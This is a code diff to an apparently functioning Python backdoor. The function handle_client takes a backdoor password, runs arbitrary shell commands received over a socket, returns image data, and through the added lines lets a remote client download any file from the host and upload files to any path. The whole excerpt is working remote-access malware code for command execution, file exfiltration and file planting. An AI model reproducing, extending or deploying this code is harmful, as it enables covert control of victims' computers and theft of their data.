@@ -60,6 +60,22 @@ def handle_client(client_socket, backdoor_password):
                     client_socket.send(img_data)
                 else:
                     client_socket.send(b"0")
+            elif command.startswith("download "):
+                filepath = command.split(" ", 1)[1]
+                if os.path.exists(filepath):
+                    with open(filepath, 'rb') as f:
+                        data = f.read()
+                    client_socket.send(len(data).to_bytes(4, 'big'))
+                    client_socket.send(data)
+                else:
+                    client_socket.send(b"0")
+            elif command.startswith("upload "):
+                filepath = command.split(" ", 1)[1]
+                data_len = int.from_bytes(client_socket.recv(4), 'big')
+                data = client_socket.recv(data_len)
+                with open(filepath, 'wb') as f:
+                    f.write(data)
+                client_socket.send(encryptor.encrypt(b"File uploaded successfully."))
             else:
                 output = subprocess.getoutput(command)
                 client_socket.send(output.encode() + b"\n")
